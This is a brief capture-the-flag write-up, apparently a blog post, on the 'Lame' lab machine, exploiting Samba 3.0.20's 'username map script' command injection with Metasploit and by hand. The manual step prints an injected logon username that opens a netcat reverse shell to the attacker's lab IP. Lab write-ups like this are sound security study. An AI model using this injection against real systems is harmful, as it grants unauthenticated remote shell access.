I"ï<p>DIGEST</p>

<p>An initial Nmap scan result will show us a vulnerable samba service which is running on port 139. It‚Äôs vulnerable to the ‚ÄúSamba username map script‚Äù vulnerability and exploited using both Manual and Metasploit module.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Lame


    
        
            
                
            
            
                OS:
                Linux
            
            
                Difficulty:
                 Easy
            
            
                Points:
                20
            
            
                Release:
                14 Mar 2017
            
            
                IP:
                10.10.10.3
</code></pre></div></div>

<p>Tools Used</p>

<p>Nmap, Searchsploit, Metsaploit</p>

<p>Initial Scan with Nmap</p>

<p>Vulnerable Samba service on port 139</p>

<p>This module exploits a command execution vulnerability in Samba versions 3.0.20 through 3.0.25rc3 when using the non-default ‚Äúusername map script‚Äù configuration option. By specifying a username containing shell meta characters, attackers can execute arbitrary commands. No authentication is needed to exploit this vulnerability since this option is used to map usernames prior to authentication!</p>

<p>Searchsploit</p>

<p>$ searchsploit Samba 3.0.20</p>

<p>MSF Module - Samba ‚Äúusername map script‚Äù Command Execution</p>

<p>$ msf&gt; use exploit/multi/samba/usermap_script</p>

<p>Manual Exploitation</p>

<p>logon ‚Äú./=nohup nc -e /bin/bash 10.10.14.18 4444‚Äù</p>

<p>Rate Matrix</p>

<p>Thanks for reading ‚ù§Ô∏è! Feel free to leave a comment üí¨ below.</p>
:ET